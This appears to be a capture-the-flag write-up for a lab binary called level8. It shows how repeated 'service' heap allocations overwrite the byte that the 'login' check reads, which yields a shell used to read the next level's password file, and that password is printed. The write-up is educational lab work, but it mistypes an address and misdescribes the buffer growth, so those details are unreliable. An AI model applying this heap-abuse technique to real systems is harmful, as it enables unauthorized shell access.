# Level08

For this one, we need to dig into the pseudo code to have a clear understanding.

First of all, the first input needs to be "auth ", that will allocate some memory with malloc.

Reset won't do anything besides freeing the allocated memory.

Typing "service" will call strdup and allocate some new memory. With each input, the address of each buffer is printed.

    $ ./level8
    (nil), (nil)
    auth
    0x804a008, (nil)
    service
    0x804a008, 0x804a018

An interesting thing happens if we call service multiple times :

    service
    0x804a008, 0x804a018 
    service
    0x804a008, 0x804a028 
    service
    0x804a008, 0x804a038 
    service
    0x804a008, 0x804a048

We are increasing the size of the buffers.

Last thing worth noting is when typing "login". It will check the 8th character of the auth buffer (8*4 = 32(dec) \ 20(hex), so its address would be 0x804a0028).
If this character is NULL, "Password:\n" is printed. But if something is written, the program will start a shell. We can simply write in this memory address by typing service twice, and then type login : 

    $ ./level8 
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    service
    0x804a008, 0x804a018 
    service
    0x804a008, 0x804a028 
    login
    $ cd ../level9
    $ cat .pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
